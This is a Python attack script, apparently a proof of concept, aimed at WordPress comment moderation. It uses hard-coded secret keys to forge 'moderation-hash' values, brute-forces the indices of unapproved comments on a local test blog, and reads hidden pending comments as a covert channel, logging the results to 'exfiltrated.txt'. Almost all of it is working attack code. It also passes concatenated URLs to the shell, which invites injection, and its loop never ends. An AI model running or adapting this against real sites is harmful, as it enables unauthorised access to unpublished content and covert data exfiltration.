#!/usr/bin/env python3

from wpc2 import *
from bs4 import BeautifulSoup
import urllib.parse
import hmac
import sys

AUTH_KEY = "0c008b2f27fbaf5e9acaaa08bf251fc98c6d38a1"
AUTH_SALT = "ea30c9849bfd208c9890cbf7bb56f59a20b52c4f"
target_blog = "http://127.0.0.3/"
sync_channel = "2021/08/06/hello-world/"

time_slot = "4:44"
comment_index = 0
prev_unapproved_index = 0

class Client:
    time_slot = ""

def compute_moderation_hash(date_str):
    salt = AUTH_KEY + AUTH_SALT
    
    assert(salt == "0c008b2f27fbaf5e9acaaa08bf251fc98c6d38a1ea30c9849bfd208c9890cbf7bb56f59a20b52c4f")
    computed_hash = hmac.new(salt.encode(), date_str.encode(), 'md5').hexdigest()
    return computed_hash

def fetch_comments_page(comments_url):
    fetch_comments_command = """
    curl '""" \
    + comments_url + \
    """' \
      -H 'Connection: keep-alive' \
      -H 'Cache-Control: max-age=0' \
      -H 'sec-ch-ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"' \
      -H 'sec-ch-ua-mobile: ?1' \
      -H 'Upgrade-Insecure-Requests: 1' \
      -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36' \
      -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
      -H 'Sec-Fetch-Site: none' \
      -H 'Sec-Fetch-Mode: navigate' \
      -H 'Sec-Fetch-User: ?1' \
      -H 'Sec-Fetch-Dest: document' \
      -H 'Accept-Language: en-US,en;q=0.9' \
      --compressed -s
    """
    curl_output = subprocess.check_output(fetch_comments_command, shell=True)
    return curl_output.decode()

def get_unapproved_index_from_url(url):
    url_parsed = urllib.parse.urlparse(url)
    queries = urllib.parse.parse_qs(url_parsed.query)

    if 'unapproved' in queries:
        return int(queries['unapproved'][0])
    else:
        return -1

def get_current_unapproved_index():
    global comment_index

    random_string = generate_random_string(10)
    comment_to_send = random_string + ": get_current_unapproved_index (" + str(comment_index) + ") "
    response = submit_comment(comment_to_send)
    comment_index += 1

    response_splitted = response.split("\n")
    response_details = response_splitted[-1]

    response_splitted = response_details.split(",")
    url = response_splitted[1]
    return get_unapproved_index_from_url(url)

def get_previous_valid_timeslot_date(current_datetime, time_slot):
    # Searches for the valid timeslot location within the previous 10 minutes
    ## For example with a time_slot of 1:11, 12:57:25 becomes 12:51:11, 12:50:00 becomes 12:41:11

    time_slot_splitted = time_slot.split(":")
    time_slot_minutes = int(time_slot_splitted[0])
    time_slot_seconds = int(time_slot_splitted[1])
    
    target_date = current_datetime
    
    target_hour = target_date.time().hour
    target_minute = target_date.time().minute
    target_minute -= 10;

    if target_minute < 0:
        target_minute = 60 + target_minute
        target_hour -= 1

    if (target_minute % 10) > time_slot_minutes:
        target_minute += 10
        if target_minute > 60:
            target_minute = target_minute - 60
            target_hour += 1

    target_minute = target_minute - (target_minute % 10) + time_slot_minutes
    target_date = target_date.replace(hour=target_hour, minute=target_minute, second=time_slot_seconds)

    return target_date

clients = []
for i in range(1, 4):
    client = Client()
    i_string = str(i)
    client.time_slot = i_string + ":" + i_string + i_string
    clients.append(client)

if prev_unapproved_index == 0:
    prev_unapproved_index = get_current_unapproved_index()

loop_counter = 99
while(loop_counter > 0):
    print("[INFO] Delaying to next timeslot. " + time_slot);
    delay_to_timeslot(time_slot)
    unapproved_index = get_current_unapproved_index()

    for client in clients:
        timeslot_date = get_previous_valid_timeslot_date(datetime.datetime.utcnow(), client.time_slot)
        timeslot_date = str(timeslot_date).split(".")[0]

        computed_hash = compute_moderation_hash(timeslot_date)
        print("[INFO] Computed hash: " + computed_hash)

        for index_offset in range(1, len(clients) + 1):
            current_unapproved_index = prev_unapproved_index + index_offset
            url = target_blog + sync_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + computed_hash + "&url=" + str(current_unapproved_index)
            print("[INFO] Checking URL: " + url);

            response_html = fetch_comments_page(url)
            soup = BeautifulSoup(response_html, "html.parser")

            if soup.find("p", class_="comment-awaiting-moderation"):
                elems = soup.find_all("div", class_="comment-content")
                elem = elems[-1]
                if elem and elem.string:
                    to_write = str(datetime.datetime.utcnow()) + ": "
                    to_write += "Extracted data with timeslot of " + client.time_slot + ": " + str(elem.string).strip() + "\n"
                    print("[INFO] " + to_write);
                    f = open("exfiltrated.txt", "a")
                    f.write(to_write)
                    f.close()
                    break
            else:
                print("[INFO] No comment for moderation for " + client.time_slot + " using index " + str(current_unapproved_index) + ". Skipping...")

    prev_unapproved_index = unapproved_index
    loop_counter += 1
